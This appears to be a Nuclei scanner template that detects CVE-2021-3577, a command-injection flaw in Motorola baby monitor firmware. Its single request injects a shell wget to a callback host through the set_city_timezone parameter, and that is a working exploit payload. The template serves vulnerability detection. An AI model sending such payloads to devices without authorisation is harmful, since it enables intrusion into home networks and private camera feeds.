id: CVE-2021-3577

info:
  name: Motorola Baby Monitors - Remote Command Execution
  author: gy741
  severity: high
  description: Motorola Baby Monitors contains multiple interface vulnerabilities could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary commands on the affected device, potentially leading to unauthorized access, data theft, or further compromise of the network.
  remediation: |
    Apply the latest firmware update provided by Motorola to mitigate the vulnerability and ensure the device is not accessible from untrusted networks.
  reference:
    - https://randywestergren.com/unauthenticated-remote-code-execution-in-motorola-baby-monitors/
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3577
    - https://binatoneglobal.com/security-advisory/
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-3577
    cwe-id: CWE-863,CWE-78
    epss-score: 0.86428
    epss-percentile: 0.99366
    cpe: cpe:2.3:o:binatoneglobal:halo\+_camera_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: binatoneglobal
    product: halo\+_camera_firmware
  tags: cve2021,cve,rce,oast,motorola,iot,binatoneglobal,vkev

http:
  - raw:
      - |
        GET /?action=command&command=set_city_timezone&value=$(wget%20http://{{interactsh-url}})) HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: word
        words:
          - "set_city_timezone"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502207f15388a49bca085c90d2624ad9d8aa488b99112417dfbbf30f001799a4f2672022100e2ce11666eaa47739b3f62c9b48efc3e84d0dde78ad8a8008b31c4087b62af49:922c64590222798bb761d5b6d8e72950